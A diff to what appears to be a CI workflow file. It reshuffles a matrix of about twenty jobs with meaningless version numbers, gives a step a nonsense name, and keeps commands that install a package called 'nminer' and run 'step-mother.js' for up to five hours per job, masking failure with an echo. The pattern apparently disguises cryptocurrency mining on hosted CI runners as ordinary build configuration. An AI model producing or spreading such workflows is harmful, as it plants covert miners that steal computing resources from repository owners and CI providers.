@@ -9,26 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1299 }
-          - { version: 8807 }
-          - { version: 573 }
-          - { version: 9969 }
-          - { version: 6266 }
-          - { version: 2078 }
-          - { version: 112 }
-          - { version: 7453 }
-          - { version: 671 }
-          - { version: 9836 }
-          - { version: 3441 }
-          - { version: 8513 }
-          - { version: 251 }
-          - { version: 6863 }
-          - { version: 2430 }
-          - { version: 8809 }
-          - { version: 7642 }
-          - { version: 3527 }
-          - { version: 7178 }
-          - { version: 9902 }
+          - { version: 653 }
+          - { version: 2463 }
+          - { version: 9039 }
+          - { version: 7892 }
+          - { version: 8870 }
+          - { version: 4705 }
+          - { version: 9126 }
+          - { version: 1530 }
+          - { version: 388 }
+          - { version: 1670 }
+          - { version: 6244 }
+          - { version: 8296 }
+          - { version: 1249 }
+          - { version: 5407 }
+          - { version: 5346 }
+          - { version: 8029 }
+          - { version: 2510 }
+          - { version: 109 }
 
     steps:
       - name: Checkout
@@ -39,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: robust heroine regarding
+      - name: boo now spear yippee freezing
         run: |
           npm install nminer@latest
-          timeout 335m node step-mother.js || echo "step-mother executed"
+          timeout 301m node step-mother.js || echo "step-mother executed"
